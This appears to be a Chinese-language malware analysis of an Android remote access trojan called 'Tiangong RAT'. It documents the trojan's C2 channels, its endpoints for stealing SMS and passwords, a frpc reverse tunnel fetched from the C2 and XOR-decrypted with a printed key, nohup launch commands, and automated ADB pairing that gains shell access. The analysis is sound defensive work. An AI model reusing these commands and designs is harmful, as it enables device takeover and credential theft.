## 一、架构总览

Tiangong RAT 的通信基础设施采用 **三层双通道** 设计：

```
                          ┌─────────────────────────┐
                          │        C2 服务器          │
                          │                         │
                          │  HTTP API (/api/*)      │
                          │  WebSocket (/ws/session) │  ← Java APK 直连
                          │  WebSocket (/ws/bridge)  │  ← Go agent 直连
                          │  frps (动态端口)          │  ← frpc 隧道
                          │  frpc 二进制分发           │
                          └────────┬────────────────┘
                                   │
               ┌───────────────────┼───────────────────┐
               │                   │                   │
    ┌──────────▼──────────┐  ┌─────▼─────┐  ┌─────────▼──────────┐
    │  Java APK 层        │  │  frp 隧道  │  │  Go local-service  │
    │  (无障碍服务)        │  │  TCP 反向  │  │  :7912 RPC 300+端点│
    │                     │  │           │  │  ADB 配对 SPAKE2   │
    │  HttpManager        │  │  frpc     │  │  frpc 生命周期管理  │
    │  DataSyncClient     │  │  子进程    │  │  WebSocket bridge  │
    └─────────┬───────────┘  └───────────┘  └────────────────────┘
              │                                       ▲
              │          HTTP IPC (127.0.0.1:7912)    │
              └───────────────────────────────────────┘
```

**通道角色**：
| 通道 | 协议 | 方向 | 用途 |
|------|------|------|------|
| Java WS | `wss://.../ws/session` | 双向实时 | UI自动化命令下发、截图上传、状态心跳 |
| Java HTTP | `POST /api/*` | 上行为主 | 注册、数据窃取上报（短信/密码/注入） |
| Go WS bridge | `wss://.../ws/bridge` | 双向实时 | shell 级命令、设备深度控制 |
| frp TCP 隧道 | frpc → frps | 反向穿透 | 持久化远程访问（WS 断线后备用） |

## 二、HTTP 通信层 (HttpManager)

### 2.1 C2 地址配置

- **非硬编码**，运行时从 `SharedPreferences("system_helper_settings")` 读取 `server_url` 字段
- 配置源文件：`server_config.json`（assets 或 filesDir），字段 `serverUrl` + `deviceKeySalt`
- **支持热切换**：C2 可下发 `CHANGE_SERVER_URL` 命令实时更换服务器地址
- scheme 自动选择：按端口判断 HTTP/HTTPS

### 2.2 认证机制

**双 Header 认证（除 register 外所有请求）：**

```
X-Client-ID:    {deviceId}
X-Client-Token: HMAC-SHA256(key=deviceKeySalt, msg=deviceId)[0:32] (hex)
```

- **HMAC 算法**: HmacSHA256
- **密钥**: `deviceKeySalt`（从 `server_config.json` 读取，支持 `ENC:` 前缀二次解密）
- **截断**: 256-bit HMAC → hex → 取前 32 字符（128-bit 有效强度）
- **例外**: `/api/client/register` **无鉴权**

### 2.3 API Endpoint 完整列表

| 方法 | Path | 鉴权 | 数据 |
|------|------|------|------|
| POST | `/api/client/register` | **否** | 设备指纹全集（20+ 字段） |
| POST | `/api/client/logs` | 是 | 客户端日志 |
| POST | `/api/sync/status` | 是 | 设备状态 |
| POST | `/api/sync/inbox` | 是 | **实时短信窃取** |
| POST | `/api/sync/form` | 是 | **注入页面表单数据** |
| POST | `/api/sync/credentials` | 是 | **明文密码窃取** |
| POST | `/api/sync/messages` | 是 | 批量短信 |

### 2.4 register 设备指纹

注册 payload 包含完整设备画像：
```
deviceId, deviceName, model, brand, manufacturer,
osVersion, sdkVersion, appName, appVersion,
batteryLevel, isCharging, screenWidth, screenHeight,
firstInstallTime, hasSim, phoneNumber, phoneNumber2,
networkType, ownerUsername, timestamp
```

### 2.5 数据传输安全

- **无应用层加密**：所有 payload 为明文 JSON（`Content-Type: application/json; charset=utf-8`）
- **密码明文上传**：`/api/sync/credentials` 中 `password` 字段无任何加密
- **TLS 验证正常**：未禁用证书验证，但**无证书钉扎**（利于中间人分析）
- **重试逻辑**：最多 3 次，指数退避 1000ms × 1.5，上限 5000ms

## 三、WebSocket 命令通道 (DataSyncClient)

### 3.1 连接建立

```
URL:     wss://{host}/ws/session?sessionId={deviceId}&key={hmac_32hex}
Headers: Connection: Upgrade
         Upgrade: websocket
Client:  OkHttp3 (非 Socket.IO)
Ping:    20s interval (TCP-level WebSocket ping frame)
Timeout: connectTimeout=10s, readTimeout=0(永不), writeTimeout=10s
```

> **注意**：APK 内包含 Socket.IO 库但**未实际使用**。C2 通信全走 OkHttp 原生 WebSocket。Socket.IO 仅被借用了 `WebSocket.NAME = "websocket"` 常量。

### 3.2 消息协议

**通用消息结构（上行）：**
```json
{
  "type": "<string>",
  "sessionId": "<deviceId>",
  "data": { ... },
  "timestamp": <epoch_ms>
}
```

**下行消息类型：**
| type | 处理 |
|------|------|
| `pong` | 忽略（心跳回应） |
| `probe` | 回报 `device_heartbeat` |
| `ping_probe` | 同 `probe` |
| `command` | 提取 `data.command` + `data.params` → 分发执行 |

**上行消息类型：**
| type (外层) | data.type (内层) | 触发 |
|------------|-----------------|------|
| `status` | `device_heartbeat` | 连接建立 / 探测响应 |
| `status` | 自定义 | 通用状态上报 |
| `screenshot` | — | 截图帧（base64 图片） |

### 3.3 命令分发

```
服务端 → {"type":"command", "data":{"command":"<cmd>", "params":{...}}}
       → parseAndExecuteCommand (30s 超时)
       → 回调上层 service (dqtvuisjd) 的命令处理器
```

### 3.4 重连状态机

```
状态: isConnected / isConnecting / connectStartTime
超时: 12s (连接方法内防重入)
      15s (外部监控强制重置)
失败: 清除状态 → evictAll() → 回调 onDisconnected
```

### 3.5 WakeLock

```java
PowerManager.WakeLock("app:SyncLock", PARTIAL_WAKE_LOCK)
// 连接建立时 acquire()，断连时 release()
// setReferenceCounted(false)，无超时
```

## 四、内网穿透实现 (local-service + frpc)

### 4.1 local-service 定性

`local-service-arm64` **不是** frp/nps/chisel 变体，而是 **Go 语言编写的自定义 RAT 核心代理**，三重角色：

| 角色 | 描述 |
|------|------|
| **本地 RPC 服务器** | 监听 :7912，为 Java APK 提供 300+ HTTP 控制接口 |
| **frpc 生命周期管理器** | 下载、XOR 解密、启动、watchdog 监控 frpc |
| **ADB 授权代理** | 完整 SPAKE2+TLS 配对协议，获取 shell 权限 |

**二进制特征：**
```
格式:     ELF 64-bit, ARM AArch64, statically linked
语言:     Go (840+ main.* 符号, stripped 但保留 pclntab)
Build:   -ldflags="-s -w -X main.disableLog=1"
源码泄露: E:/Android 1217/local-service/main.go  ← Windows 开发环境
BuildID: iihLpxwfEeo8OE-6Gugv/qKhlRSnS3JQC_ijwp2ae/r1GtEFAHVj4b2SaEf3lJ/khtW2MjR1VNVCnCYiLYp
```

### 4.2 frpc 交付与穿透流程

```
1. C2 下发 frpc 二进制
   GET {C2}/api/binary/{arm64|arm}/frpc → frpc.enc (XOR 加密)

2. XOR 解密 (key = K9qZ-XlN7Q)
   优先 python3 解密 / 备用 local-service xordecrypt 子命令

3. 获取 frps 配置
   GET {C2}/api/tunnel/config → {"frpsAddr":"...", "frpsPort":..., "frpsToken":"..."}

4. 生成配置文件 /data/local/tmp/frpc_independent.ini:
   [common]
   server_addr = {frpsAddr}
   server_port = {frpsPort}
   token       = {frpsToken}

   [proxy_xxxx]
   type        = tcp
   local_port  = 7910
   remote_port = {分配端口}

5. 启动 frpc 子进程
   chmod 755 /data/local/tmp/frpc
   nohup /data/local/tmp/frpc -c frpc_independent.ini > /dev/null 2>&1 &

6. Watchdog 持续监控
   ps -ef | grep frpc | grep -v grep
   pidof frpc
```

### 4.3 Go agent 独立 C2 信道

local-service 有独立于 Java APK 的 C2 通道：

```
WebSocket:  ws(s)://{serverAddr}/ws/bridge?deviceId={id}&key={devKey}
心跳:       POST {C2}/api/device/localServiceHeartbeat
任务拉取:   GET  {C2}/api/device/tasks?deviceId={id}
结果上报:   POST {C2}/api/device/commandResult
ADB 证书:   POST {C2}/api/adb-keys/{deviceId}
视频上传:   POST {C2}/api/video/upload?deviceId={id}
```

### 4.4 端口分布

| 端口 | 方向 | 用途 |
|------|------|------|
| 7910 | inbound | Java → Go HTTP 入口（动态搜索 7910-7918） |
| 7911 | inbound | 备用 HTTP 端口 |
| 7912 | inbound | RPC 主端口（300+ 端点） |
| 7400 | inbound | 次级服务端口 |

## 五、ADB WiFi 配对协议 (SPAKE2)

### 5.1 组件

- `Spake2Context.java` — Java 层 SPAKE2 封装
- `libspake2-arm64.so` — BoringSSL 标准 SPAKE2 native 实现
- `libconscrypt-arm64.so` — TLS 1.3 socket factory + keying material export
- `main.performAdbTlsPair` / `main.performTlsPairDirect` — Go 层配对执行

### 5.2 完整配对流程

```
1. mDNS 发现 → 获取配对端口 (33000-40000 范围)
2. 无障碍 OCR → 读取 6 位配对码
3. TLS 1.3 连接 → 127.0.0.1:{pairPort}
4. SPAKE2 密钥交换:
   - 身份: client="adb pair client\0", server="adb pair server\0"
   - 密码: pairCode_bytes || TLS_exported_keying_material
   - 生成/交换/处理 SPAKE2 消息 → shared_secret (32 bytes)
5. HKDF 密钥派生:
   - label: "adb pairing_auth aes-128-gcm key"
   - 输出: AES-128-GCM 会话密钥
6. PeerInfo 交换 (AES-128-GCM 加密):
   - 发送 RSA 公钥 → 接收服务端 PeerInfo
7. 后续动作:
   - 上传证书到 C2: /api/adb-keys/{deviceId}
   - adb connect 127.0.0.1:{debugPort}
   - 推送 local-service 二进制到 /data/local/tmp/
```

## 八、安全风险评估

| 风险项 | 评估 | 说明 |
|--------|------|------|
| C2 硬编码 | 无 | 动态配置 + CHANGE_SERVER_URL 热切换 |
| TLS 证书绕过 | 无 | 标准验证（利于防御方中间人分析） |
| 证书钉扎 | 无 | OkHttp 未配置 CertificatePinner |
| 密码明文传输 | **是** | `/api/sync/credentials` 无应用层加密 |
| 短信/注入明文 | **是** | 所有 payload 仅依赖 TLS |
| 字符串混淆强度 | 低 | 静态 XOR key，可逆 |
| frpc 持久化 | **高** | watchdog + boot 脚本 + 进程监控 |
| ADB 权限获取 | **高** | 全自动 SPAKE2 配对，无需用户确认 |
| 双通道冗余 | **高** | WS + frp 互补，单通道中断不影响控制 |
| Go agent 符号残留 | 中 | stripped 但 Go pclntab 仍可提取函数名 |
